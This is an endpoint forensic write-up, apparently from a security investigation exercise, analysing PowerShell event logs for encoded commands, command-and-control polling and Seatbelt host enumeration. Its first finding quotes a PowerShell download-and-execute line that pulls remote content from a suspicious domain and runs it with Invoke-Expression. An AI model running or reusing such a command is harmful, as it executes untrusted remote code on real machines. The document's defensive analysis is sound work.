# Phase 03 — Endpoint Security Investigation

## Evidence source

- `powershell.json`, exported PowerShell operational events
- User context observed in event output: `QL-WKSTN-5693\j.westcott`
- Relevant event IDs include 4104 (script block logging) and 4100 (PowerShell errors)

## Findings

### 1. Encoded PowerShell and remote content retrieval

PowerShell event ID 4104, record ID 500, at approximately `2023-01-13 17:10:07 UTC` records the command associated with the LNK:

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

The shortcut metadata shows hidden PowerShell with `-nop`, `-windowstyle hidden`, and `-enc`. The command downloads a remote string and passes it to `Invoke-Expression` (`iex`), which is a high-risk execution pattern. The PCAP independently shows a GET for the same URL at `17:10:09.751986 UTC`.

### 2. Command polling and result reporting

Event ID 4104, record ID 501, around `17:10:11 UTC`, references `cdn.bpakcaging.xyz:8080`, a unique HTTP header identifier, repeated polling for commands, execution of returned content using `iex`, and posting results back. This strongly supports a command-and-control-like script pattern. Correlating HTTP exchanges in the PCAP strengthens the assessment.

### 3. Errors and tool-related activity

- Event ID 4100 errors between approximately `17:10:24` and `17:10:54 UTC` include `Invoke-WebRequest` parsing errors related to the Internet Explorer parsing engine. These errors do not prove all requests failed.
- Event ID 4100, record ID 554, at approximately `17:12:18 UTC`, contains an `Invoke-Expression` error involving HTML from a GitHub page. This suggests content intended as PowerShell may have been interpreted as HTML; confirm exact context before asserting the effect.
- Later logs show attempts to retrieve `Invoke-Seatbelt.ps1` and commands invoking `sb.exe` with `system`, `all`, and `-group=all` arguments around `17:15:49 UTC`. This is consistent with host enumeration. The records establish attempted commands, not necessarily successful completion of every command.

## Assessment

The endpoint evidence strongly supports suspicious PowerShell execution, remote content retrieval, command polling, and attempted host reconnaissance. Combined with network evidence, command-and-control-like behavior is highly likely.

## Limitations

The reviewed records do not by themselves establish the complete payload functionality, persistence, credential theft, or successful exfiltration. Preserve event IDs, record IDs, timestamps, and raw command lines when presenting these findings.
